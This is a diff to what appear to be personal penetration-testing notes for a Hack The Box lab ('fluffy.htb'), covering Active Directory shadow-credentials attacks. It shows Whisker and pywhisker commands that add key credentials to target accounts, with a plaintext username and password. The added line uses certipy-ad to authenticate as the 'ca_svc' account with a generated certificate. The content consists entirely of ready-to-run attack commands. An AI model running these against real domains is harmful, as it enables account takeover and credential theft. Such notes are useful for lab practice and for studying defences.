@@ -33,6 +33,8 @@ Whisker.exe add /target:VictimUser /domain:warzone.oxsium.local /dc:192.168.0.19
 # PyWhisker
 ```powershell
 python3 Tools/pywhisker.py -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' --target 'ca_svc' --action add
+
+certipy-ad auth -pfx aGNzFuXw.pfx -password 'rS9MhFmMFxLod6A8tKqG' -username 'ca_svc' -domain 'fluffy.htb' -dc-ip 10.129.18.236
 ```
 
 # Get TGT
